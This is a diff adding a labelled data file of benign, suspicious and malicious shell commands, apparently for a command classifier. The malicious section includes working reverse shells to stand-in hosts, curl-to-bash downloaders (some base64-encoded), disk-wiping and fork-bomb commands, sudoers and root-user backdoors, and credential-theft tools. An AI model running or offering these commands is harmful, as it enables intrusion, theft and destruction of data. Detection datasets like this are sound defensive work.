@@ -1,0 +1,157 @@
+# FORMAT: label|command
+# 50 benign, 50 suspicious, and 50 malicious commands
+# ------- BENIGN (50) -------
+benign|ls -la /var/log
+benign|cat /etc/hostname
+benign|df -h
+benign|uptime
+benign|whoami
+benign|pwd
+benign|echo "hello world"
+benign|date +%Y-%m-%d
+benign|ps aux --sort=-%mem | head -10
+benign|free -m
+benign|uname -a
+benign|id
+benign|hostname
+benign|du -sh /tmp
+benign|ls -lR /home
+benign|cat /proc/cpuinfo | head -20
+benign|top -bn1 | head -5
+benign|ip addr show
+benign|ping -c 3 8.8.8.8
+benign|dig google.com
+benign|curl -s https://ifconfig.me
+benign|grep -r "error" /var/log/syslog | tail -20
+benign|find /tmp -type f -mtime -1
+benign|wc -l /etc/passwd
+benign|tail -n 50 /var/log/auth.log
+benign|systemctl status nginx
+benign|journalctl -u sshd --no-pager -n 20
+benign|mount | grep ext4
+benign|lsblk
+benign|cat /etc/os-release
+benign|env | grep PATH
+benign|alias
+benign|history | tail -10
+benign|file /bin/ls
+benign|stat /etc/passwd
+benign|head -5 /etc/group
+benign|ls /usr/bin | wc -l
+benign|dpkg -l | grep python
+benign|pip list 2>/dev/null | head -10
+benign|git log --oneline -5
+benign|docker ps
+benign|kubectl get pods 2>/dev/null
+benign|ss -tuln
+benign|netstat -rn
+benign|arp -a
+benign|route -n
+benign|crontab -l
+benign|tar tzf backup.tar.gz 2>/dev/null | head -5
+benign|md5sum /etc/passwd
+benign|chmod 644 myfile.txt
+benign|cp /tmp/report.csv /home/user/reports/
+# ------- SUSPICIOUS (50) -------
+suspicious|curl -s http://192.168.1.100:8080/update.sh -o /tmp/update.sh
+suspicious|wget -q http://10.0.0.5/tools/agent.bin -O /tmp/agent.bin
+suspicious|nmap -sn 192.168.1.0/24
+suspicious|cat /etc/passwd
+suspicious|cat /proc/self/maps
+suspicious|ls -la /root
+suspicious|find / -name "*.pem" 2>/dev/null
+suspicious|find / -name "id_rsa" 2>/dev/null
+suspicious|find / -writable -type d 2>/dev/null
+suspicious|find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
+suspicious|grep -ri "password" /etc/ 2>/dev/null
+suspicious|grep -ri "api_key" /home/ 2>/dev/null
+suspicious|env | grep -i secret
+suspicious|env | grep -i token
+suspicious|strings /proc/1/environ 2>/dev/null
+suspicious|cat /proc/net/tcp
+suspicious|ss -antp
+suspicious|netstat -tulpn
+suspicious|last -20
+suspicious|lastlog
+suspicious|w
+suspicious|who
+suspicious|cat /etc/crontab
+suspicious|ls -la /etc/cron.d/
+suspicious|systemctl list-units --type=service --state=running
+suspicious|ps auxww
+suspicious|ls -la /dev/shm
+suspicious|mount -o remount,rw /
+suspicious|chmod 777 /tmp/script.sh
+suspicious|curl -X POST http://10.0.0.5:9090/data -d @/etc/hostname
+suspicious|tar czf /tmp/backup.tar.gz /home/user/.ssh/
+suspicious|scp /etc/passwd user@10.0.0.5:/tmp/
+suspicious|rsync -avz /var/log/ user@10.0.0.5:/tmp/logs/
+suspicious|python3 -m http.server 8080
+suspicious|nc -lvnp 9999
+suspicious|ncat -l 4444
+suspicious|socat TCP-LISTEN:8080,fork -
+suspicious|strace -p 1 -e trace=read
+suspicious|ltrace -p $(pgrep sshd) 2>/dev/null
+suspicious|gdb -p $(pgrep apache2) --batch -ex "info proc mappings"
+suspicious|cat /proc/version
+suspicious|dmesg | grep -i virtual
+suspicious|systemd-detect-virt
+suspicious|dmidecode -s system-manufacturer 2>/dev/null
+suspicious|lsmod | grep -i vbox
+suspicious|ip route
+suspicious|iptables -L -n
+suspicious|sestatus
+suspicious|aa-status
+suspicious|getfacl /etc/shadow
+suspicious|sudo -l
+# ------- MALICIOUS (50) -------
+malicious|curl http://evil.com/shell.sh | bash
+malicious|bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+malicious|python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.1',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
+malicious|nc -e /bin/sh 10.0.0.1 4444
+malicious|rm -rf / --no-preserve-root
+malicious|:(){ :|:& };:
+malicious|dd if=/dev/zero of=/dev/sda bs=1M
+malicious|mkfs.ext4 /dev/sda1
+malicious|echo "* * * * * curl http://evil.com/mine | bash" | crontab -
+malicious|wget -q http://malware.site/payload -O /tmp/.hidden && chmod +x /tmp/.hidden && /tmp/.hidden
+malicious|cat /etc/shadow
+malicious|unshadow /etc/passwd /etc/shadow > /tmp/crackme
+malicious|john /tmp/crackme --wordlist=/usr/share/wordlists/rockyou.txt
+malicious|nmap -sS -p- 192.168.1.0/24
+malicious|nmap -sV --script=vuln 10.0.0.5
+malicious|hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.5
+malicious|sqlmap -u "http://target.com/page?id=1" --dbs
+malicious|nikto -h http://target.com
+malicious|msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; run"
+malicious|powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA
+malicious|chmod u+s /bin/bash
+malicious|cp /bin/bash /tmp/.backdoor && chmod u+s /tmp/.backdoor
+malicious|echo "attacker ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
+malicious|useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor
+malicious|iptables -F && iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT
+malicious|ssh-keygen -t rsa -N "" -f /tmp/key && cat /tmp/key.pub >> /root/.ssh/authorized_keys
+malicious|find / -perm -4000 -type f 2>/dev/null
+malicious|tcpdump -i eth0 -w /tmp/capture.pcap
+malicious|ettercap -T -q -i eth0 -M arp:remote /10.0.0.1// /10.0.0.254//
+malicious|arpspoof -i eth0 -t 10.0.0.1 10.0.0.254
+malicious|responder -I eth0 -wrf
+malicious|mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+malicious|certutil -urlcache -split -f http://evil.com/payload.exe C:\temp\payload.exe
+malicious|reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d C:\temp\payload.exe
+malicious|schtasks /create /tn "Updater" /tr "powershell -ep bypass -f C:\temp\payload.ps1" /sc onlogon
+malicious|wmic process call create "cmd /c powershell -ep bypass -nop -w hidden -c IEX(wget http://evil.com/s)"
+malicious|bitsadmin /transfer job /download /priority high http://evil.com/payload.exe C:\temp\payload.exe
+malicious|python3 -c "import pty; pty.spawn('/bin/bash')"
+malicious|perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
+malicious|ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+malicious|php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+malicious|socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444
+malicious|openssl s_client -quiet -connect 10.0.0.1:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445
+malicious|base64 -d <<< "Y3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo" | bash
+malicious|eval $(echo "Y3VybCBodHRwOi8vZXZpbC5jb20vcGF5bG9hZCB8IGJhc2g=" | base64 -d)
+malicious|xterm -display 10.0.0.1:1 -e /bin/bash
+malicious|linpeas.sh
+malicious|./pspy64
+malicious|chisel client 10.0.0.1:8080 R:1080:socks
+malicious|ssh -D 1080 -fNq user@10.0.0.1
